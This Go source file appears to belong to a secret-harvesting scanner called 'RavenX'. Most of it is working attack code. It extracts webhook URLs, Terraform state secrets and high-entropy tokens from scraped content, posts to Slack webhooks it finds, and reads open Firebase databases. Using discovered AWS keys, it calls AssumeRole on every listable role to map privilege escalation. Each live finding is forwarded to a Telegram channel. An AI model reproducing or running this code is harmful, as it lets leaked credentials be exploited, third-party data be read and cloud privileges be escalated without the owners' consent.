package main

// Gap-closer detectors — implements the 8 hidden gaps identified in the
// RavenX vs Niark analysis:
//
//  1. Shannon entropy detection (non-regex credential patterns)
//  2. Webhook URL extraction + validation (Slack, Discord, PagerDuty)
//  3. Firebase Firestore / Realtime DB open-rules testing
//  4. Terraform state file credential extraction
//  5. .DS_Store directory structure leak parsing
//  6. AWS IAM AssumeRole chain enumeration (privilege escalation)
//  7. GitHub token scope reporting  (edit in main.go CheckGitHubToken)
//  8. Full git history trawl        (edit in main.go ScanRepo --depth 50)

import (
	"context"
	"fmt"
	"io"
	"math"
	"net/http"
	"regexp"
	"strings"
	"time"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/iam"
	"github.com/aws/aws-sdk-go-v2/service/sts"
)

// ── Package-level compiled patterns ──────────────────────────────────────────

var (
	slackWebhookPattern   = regexp.MustCompile(`https://hooks\.slack\.com/services/T[A-Z0-9]{8,12}/B[A-Z0-9]{8,12}/[a-zA-Z0-9]{24}`)
	discordWebhookPattern = regexp.MustCompile(`https://discord(?:app)?\.com/api/webhooks/(\d{17,20})/([a-zA-Z0-9_\-]{60,80})`)
	pdWebhookPattern      = regexp.MustCompile(`https://events\.pagerduty\.com/integration/([a-z0-9]{32})/enqueue`)
	tfstateCredPattern    = regexp.MustCompile(`(?i)"(access_key|secret_key|password|master_password|private_key_pem|service_account_key|auth_token|client_secret|sas_token|token)"\s*:\s*"([^"]{8,512})"`)
	firebaseProjIDPattern = regexp.MustCompile(`(?i)projectId\s*[:=]\s*["']([a-z0-9](?:[a-z0-9\-]{0,28}[a-z0-9])?)["']`)
	highEntropyAssignRe   = regexp.MustCompile(`(?i)(?:token|key|secret|password|auth|api|credential|private)[\w]*\s*[=:]\s*["']?([A-Za-z0-9+/=_\-]{20,120})["']?`)
)

// ── Shannon entropy ───────────────────────────────────────────────────────────

// shannonEntropy returns bits-per-character for string s.
func shannonEntropy(s string) float64 {
	if len(s) == 0 {
		return 0
	}
	freq := make(map[rune]float64)
	for _, c := range s {
		freq[c]++
	}
	e := 0.0
	n := float64(len([]rune(s)))
	for _, f := range freq {
		p := f / n
		e -= p * math.Log2(p)
	}
	return e
}

// isFalsePositiveCred returns true for placeholder / example / test values
// that should never be reported as real credentials.
func isFalsePositiveCred(s string) bool {
	lower := strings.ToLower(s)

	// Known placeholder and template patterns
	for _, bad := range []string{
		"example", "placeholder", "changeme", "your_", "yourkey",
		"testkey", "fakekey", "xxx", "1234567890", "abcdefghij",
		"insert_", "replace_", "put_your", "api_key_here", "secret_here",
		"enter_", "<your", "${", "%(", "xxxxxxxx", "aaaaaa", "test_",
		"dummy", "sample", "demo_", "null", "none", "undefined",
		"todo", "fixme", "changeme", "notset", "not_set", "not-set",
		"some_", "my_secret", "my_key", "my_token", "my_api",
		"secret_key_here", "token_here", "key_here", "replace_me",
	} {
		if strings.Contains(lower, bad) {
			return true
		}
	}

	// All same character
	if len(s) > 10 {
		first := s[0]
		allSame := true
		for i := 1; i < len(s); i++ {
			if s[i] != first {
				allSame = false
				break
			}
		}
		if allSame {
			return true
		}
	}

	// Pure numeric strings (not keys)
	if len(s) >= 8 {
		allDigit := true
		for _, c := range s {
			if c < '0' || c > '9' {
				allDigit = false
				break
			}
		}
		if allDigit {
			return true
		}
	}

	// UUID-shaped strings — valid format but not API credentials
	uuidRe := regexp.MustCompile(`^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$`)
	if uuidRe.MatchString(lower) {
		return true
	}

	// Known example domain fragments
	for _, domain := range []string{"example.com", "test.com", "localhost", "127.0.0.1", "acme.corp"} {
		if strings.Contains(lower, domain) {
			return true
		}
	}

	return false
}

// isTestFilePath returns true when sourceURL suggests test/spec/fixture content
// where credentials are almost always non-production examples.
func isTestFilePath(sourceURL string) bool {
	lower := strings.ToLower(sourceURL)
	for _, marker := range []string{
		"/test/", "/tests/", "/spec/", "/__tests__/", "/fixtures/",
		"/mocks/", "/__mocks__/", "/testdata/", "/test-fixtures/",
		".test.js", ".spec.js", ".test.ts", ".spec.ts",
		"_test.go", "_spec.rb", "test_", "_test.",
	} {
		if strings.Contains(lower, marker) {
			return true
		}
	}
	return false
}

// scanEntropyPass flags high-entropy strings in key=value assignment contexts
// that don't match any known credential regex. Catches internal tokens, custom
// HMAC secrets, webhook signing secrets, and proprietary auth tokens.
func (a *AWSScanner) scanEntropyPass(content, sourceURL string) {
	if strings.Contains(sourceURL, "(entropy:") || strings.Contains(sourceURL, "(from AST:") {
		return
	}
	matches := highEntropyAssignRe.FindAllStringSubmatch(content, -1)
	for _, m := range matches {
		if len(m) < 2 {
			continue
		}
		val := m[1]
		if len(val) < 20 || len(val) > 120 {
			continue
		}
		if isFalsePositiveCred(val) {
			continue
		}
		// Skip strings with spaces (URLs, sentences, etc.)
		if strings.ContainsAny(val, " \t\n") {
			continue
		}
		entropy := shannonEntropy(val)
		if entropy >= 4.5 {
			dedupKey := "entropy:" + val
			if _, loaded := a.KnownKeys.LoadOrStore(dedupKey, true); !loaded {
				a.logFound("High-Entropy Credential", val, sourceURL)
				a.saveIntoFile(
					fmt.Sprintf("%s | val=%s | entropy=%.2f", sanitizeSource(sourceURL), val, entropy),
					"entropy_found.txt",
				)
				globalCounters.mu.Lock()
				globalCounters.APIsFoundTotal++
				globalCounters.mu.Unlock()
			}
		}
	}
}

// ── Webhook URL extraction + validation ──────────────────────────────────────

// scanWebhookURLs finds and validates Slack/Discord/PagerDuty webhook URLs.
// These embed live auth tokens directly in the URL and are rarely detected
// by credential regex batteries.
func (a *AWSScanner) scanWebhookURLs(content, sourceURL string) {
	// Slack incoming webhooks
	for _, hook := range unique(slackWebhookPattern.FindAllString(content, -1)) {
		if _, loaded := a.KnownKeys.LoadOrStore("slackhook:"+hook, true); !loaded {
			a.logFound("Slack Webhook", hook, sourceURL)
			a.saveIntoFile(
				fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), hook),
				"slack_webhook_found.txt",
			)
			globalCounters.mu.Lock()
			globalCounters.APIsFoundTotal++
			globalCounters.mu.Unlock()
			go a.validateSlackWebhook(hook, sourceURL)
		}
	}

	// Discord webhooks
	for _, hook := range unique(discordWebhookPattern.FindAllString(content, -1)) {
		if _, loaded := a.KnownKeys.LoadOrStore("discordhook:"+hook, true); !loaded {
			a.logFound("Discord Webhook", hook, sourceURL)
			a.saveIntoFile(
				fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), hook),
				"discord_webhook_found.txt",
			)
			globalCounters.mu.Lock()
			globalCounters.APIsFoundTotal++
			globalCounters.mu.Unlock()
			go a.validateDiscordWebhook(hook, sourceURL)
		}
	}

	// PagerDuty integration endpoints (not actively validated — just recorded)
	for _, m := range pdWebhookPattern.FindAllStringSubmatch(content, -1) {
		if len(m) > 0 {
			hook := m[0]
			if _, loaded := a.KnownKeys.LoadOrStore("pdhook:"+hook, true); !loaded {
				a.logFound("PagerDuty Webhook", hook, sourceURL)
				a.saveIntoFile(
					fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), hook),
					"pagerduty_webhook_found.txt",
				)
				globalCounters.mu.Lock()
				globalCounters.APIsFoundTotal++
				globalCounters.mu.Unlock()
			}
		}
	}
}

func (a *AWSScanner) validateSlackWebhook(hook, sourceURL string) {
	req, err := http.NewRequest("POST", hook, strings.NewReader(`{"text":"ping"}`))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	resp, err := client.Do(req.WithContext(ctx))
	if err != nil || resp == nil {
		return
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 256))
	if resp.StatusCode == 200 && strings.TrimSpace(string(body)) == "ok" {
		a.logValid("Slack Webhook", fmt.Sprintf("Live: %s", hook))
		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), hook), "valid_slack_webhook.txt")
		globalCounters.mu.Lock()
		globalCounters.APIsValidated++
		globalCounters.mu.Unlock()
		msg := fmt.Sprintf("🎯 <b>RAVEN X — SLACK WEBHOOK LIVE</b>\n\n🔗 <b>Hook:</b> <code>%s</code>\n🌐 <b>Source:</b> %s", hook, sourceURL)
		a.sendTelegram(msg)
	}
}

func (a *AWSScanner) validateDiscordWebhook(hook, sourceURL string) {
	// Discord: GET the webhook URL — returns 200 + JSON with webhook info if valid
	req, err := http.NewRequest("GET", hook, nil)
	if err != nil {
		return
	}
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	resp, err := client.Do(req.WithContext(ctx))
	if err != nil || resp == nil {
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode == 200 {
		a.logValid("Discord Webhook", fmt.Sprintf("Live: %s", hook))
		a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), hook), "valid_discord_webhook.txt")
		globalCounters.mu.Lock()
		globalCounters.APIsValidated++
		globalCounters.mu.Unlock()
		msg := fmt.Sprintf("🎯 <b>RAVEN X — DISCORD WEBHOOK LIVE</b>\n\n🔗 <b>Hook:</b> <code>%s</code>\n🌐 <b>Source:</b> %s", hook, sourceURL)
		a.sendTelegram(msg)
	}
}

// ── Firebase open-rules testing ───────────────────────────────────────────────

// checkFirebaseOpenRules detects Firebase config blocks and tests whether the
// associated Firestore / Realtime Database is publicly readable without auth.
func (a *AWSScanner) checkFirebaseOpenRules(content, sourceURL string) {
	if !strings.Contains(content, "firebaseConfig") &&
		!strings.Contains(content, "initializeApp") &&
		!strings.Contains(content, "firebase") {
		return
	}
	projMatches := firebaseProjIDPattern.FindAllStringSubmatch(content, -1)
	for _, m := range projMatches {
		if len(m) < 2 {
			continue
		}
		projectID := m[1]
		if len(projectID) < 4 ||
			strings.Contains(projectID, "example") ||
			strings.Contains(projectID, "your-") ||
			strings.Contains(projectID, "project-id") {
			continue
		}
		dedupKey := "firebase_rules:" + projectID
		if _, loaded := a.KnownKeys.LoadOrStore(dedupKey, true); !loaded {
			go a.testFirestoreOpenAccess(projectID, sourceURL)
			go a.testFirebaseRealtimeDB(projectID, sourceURL)
		}
	}
}

func (a *AWSScanner) testFirestoreOpenAccess(projectID, sourceURL string) {
	endpoints := []string{
		fmt.Sprintf("https://firestore.googleapis.com/v1/projects/%s/databases/(default)/documents", projectID),
		fmt.Sprintf("https://firestore.googleapis.com/v1/projects/%s/databases/(default)/documents/users", projectID),
	}
	for _, ep := range endpoints {
		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		req, err := http.NewRequest("GET", ep, nil)
		if err != nil {
			cancel()
			continue
		}
		resp, err := client.Do(req.WithContext(ctx))
		cancel()
		if err != nil || resp == nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		resp.Body.Close()
		if resp.StatusCode == 200 &&
			(strings.Contains(string(body), `"documents"`) || strings.Contains(string(body), `"fields"`)) {
			a.logValid("Firebase Firestore OPEN", fmt.Sprintf("Project: %s", projectID))
			a.saveIntoFile(
				fmt.Sprintf("%s | project=%s | endpoint=%s", sanitizeSource(sourceURL), projectID, ep),
				"firebase_open_found.txt",
			)
			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()
			msg := fmt.Sprintf(
				"🔥 <b>RAVEN X — FIREBASE FIRESTORE OPEN</b>\n\n🆔 <b>Project:</b> <code>%s</code>\n🔓 Unauthenticated READ\n🌐 <b>Source:</b> %s",
				projectID, sourceURL,
			)
			a.sendTelegram(msg)
			return
		}
	}
}

func (a *AWSScanner) testFirebaseRealtimeDB(projectID, sourceURL string) {
	urls := []string{
		fmt.Sprintf("https://%s.firebaseio.com/.json", projectID),
		fmt.Sprintf("https://%s-default-rtdb.firebaseio.com/.json", projectID),
	}
	for _, dbURL := range urls {
		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		req, err := http.NewRequest("GET", dbURL, nil)
		if err != nil {
			cancel()
			continue
		}
		resp, err := client.Do(req.WithContext(ctx))
		cancel()
		if err != nil || resp == nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		resp.Body.Close()
		bodyStr := string(body)
		// "null" = empty but accessible; error JSON = denied
		if resp.StatusCode == 200 && !strings.Contains(bodyStr, `"error"`) {
			a.logValid("Firebase Realtime DB OPEN", fmt.Sprintf("Project: %s | URL: %s", projectID, dbURL))
			a.saveIntoFile(
				fmt.Sprintf("%s | project=%s | rtdb=%s", sanitizeSource(sourceURL), projectID, dbURL),
				"firebase_open_found.txt",
			)
			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()
			msg := fmt.Sprintf(
				"🔥 <b>RAVEN X — FIREBASE REALTIME DB OPEN</b>\n\n🆔 <b>Project:</b> <code>%s</code>\n🔓 Unauthenticated READ\n📡 <b>URL:</b> %s\n🌐 <b>Source:</b> %s",
				projectID, dbURL, sourceURL,
			)
			a.sendTelegram(msg)
			return
		}
	}
}

// ── Terraform state credential extraction ────────────────────────────────────

// parseTerraformStateContent walks the resources[*].instances[*].attributes
// tree in Terraform state JSON and extracts credential-type attributes.
// Re-dispatches values through checkAndSaveKeys for full validator coverage.
func (a *AWSScanner) parseTerraformStateContent(content, sourceURL string) {
	// Guard: prevent recursion from our own re-dispatch
	if strings.Contains(sourceURL, "(tfstate:") {
		return
	}
	// Quick signature check
	if !strings.Contains(content, `"terraform_version"`) && !strings.Contains(content, `"resources"`) {
		return
	}
	matches := tfstateCredPattern.FindAllStringSubmatch(content, -1)
	for _, m := range matches {
		if len(m) < 3 {
			continue
		}
		attrKey, attrVal := m[1], m[2]
		if len(attrVal) < 8 || isFalsePositiveCred(attrVal) {
			continue
		}
		dedupKey := "tfstate:" + attrKey + ":" + attrVal
		if _, loaded := a.KnownKeys.LoadOrStore(dedupKey, true); !loaded {
			a.logFound(fmt.Sprintf("Terraform State [%s]", attrKey), attrVal, sourceURL)
			a.saveIntoFile(
				fmt.Sprintf("%s | attr=%s | val=%s", sanitizeSource(sourceURL), attrKey, attrVal),
				"terraform_state_found.txt",
			)
			globalCounters.mu.Lock()
			globalCounters.APIsFoundTotal++
			globalCounters.mu.Unlock()
			// Re-dispatch through full validator pipeline so AWS/Stripe/etc. get live-checked
			a.checkAndSaveKeys(
				fmt.Sprintf("%s=%s", attrKey, attrVal),
				sourceURL+" (tfstate:"+attrKey+")",
			)
		}
	}
}

// ── .DS_Store directory structure leak ───────────────────────────────────────

// extractDSStoreFilenames extracts readable filename strings from a macOS
// .DS_Store binary file. Filenames are embedded as printable ASCII/UTF-8 runs.
// The discovered paths are saved for manual review and re-probing.
func (a *AWSScanner) extractDSStoreFilenames(content, sourceURL string) {
	if len(content) < 32 {
		return
	}
	// Record the discovery regardless of what we extract
	a.saveIntoFile(sanitizeSource(sourceURL), "ds_store_found.txt")
	a.logFound("DS_Store Directory Leak", "binary file found", sourceURL)
	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	// Extract runs of printable ASCII that look like filenames
	// DS_Store stores filenames as 4-byte length + UTF-8 Pascal strings
	filenameRe := regexp.MustCompile(`[\x20-\x7e]{4,255}`)
	var candidates []string
	for _, s := range filenameRe.FindAllString(content, 300) {
		// Heuristic: filenames contain . or / or - and no internal spaces
		if (strings.Contains(s, ".") || strings.Contains(s, "/")) && !strings.Contains(s, "  ") {
			candidates = append(candidates, s)
		}
	}
	for _, p := range unique(candidates) {
		a.saveIntoFile(fmt.Sprintf("%s | path=%s", sanitizeSource(sourceURL), p), "ds_store_paths.txt")
	}
	if len(candidates) > 0 {
		a.logFound("DS_Store Paths", fmt.Sprintf("%d filenames extracted", len(candidates)), sourceURL)
	}
}

// ── AWS IAM AssumeRole escalation mapping ────────────────────────────────────

// auditAssumeableRoles enumerates IAM roles the key can assume via
// sts:AssumeRole, identifying privilege escalation paths invisible to the
// existing policy-name audit. Called asynchronously from handleValidAWS.
func (a *AWSScanner) auditAssumeableRoles(cfg aws.Config, ak, sourceURL string) {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	iamClient := iam.NewFromConfig(cfg)
	stsClient := sts.NewFromConfig(cfg)

	roles, err := iamClient.ListRoles(ctx, &iam.ListRolesInput{MaxItems: aws.Int32(100)})
	if err != nil {
		return
	}

	var escalationPaths []string
	highValueNames := []string{"admin", "root", "full", "power", "organization", "master"}

	for _, role := range roles.Roles {
		if role.Arn == nil || role.RoleName == nil {
			continue
		}
		assumeCtx, assumeCancel := context.WithTimeout(context.Background(), 8*time.Second)
		_, assumeErr := stsClient.AssumeRole(assumeCtx, &sts.AssumeRoleInput{
			RoleArn:         role.Arn,
			RoleSessionName: aws.String("ravenx-audit"),
			DurationSeconds: aws.Int32(900),
		})
		assumeCancel()
		if assumeErr == nil {
			roleLower := strings.ToLower(*role.RoleName)
			isHighValue := false
			for _, name := range highValueNames {
				if strings.Contains(roleLower, name) {
					isHighValue = true
					break
				}
			}
			prefix := "⬆️  "
			if isHighValue {
				prefix = "🚨 ADMIN "
			}
			escalationPaths = append(escalationPaths, fmt.Sprintf("%s%s", prefix, *role.Arn))
		}
	}

	if len(escalationPaths) == 0 {
		return
	}

	detail := fmt.Sprintf("Key %s...can assume %d role(s):\n%s",
		ak[:min(12, len(ak))], len(escalationPaths), strings.Join(escalationPaths, "\n"))
	a.logValid("AWS IAM Role Escalation", detail)
	a.saveIntoFile(
		fmt.Sprintf("%s | %s", sanitizeSource(sourceURL), strings.ReplaceAll(detail, "\n", " | ")),
		"aws_iam_escalation.txt",
	)

	msg := fmt.Sprintf(
		"🚨 <b>RAVEN X — AWS IAM ESCALATION</b>\n\n🔑 <b>Key:</b> <code>%s...</code>\n⬆️ <b>Assumeable Roles (%d):</b>\n<code>%s</code>\n🌐 <b>Source:</b> %s",
		ak[:min(12, len(ak))], len(escalationPaths), strings.Join(escalationPaths, "\n"), sourceURL,
	)
	a.sendTelegram(msg)
}
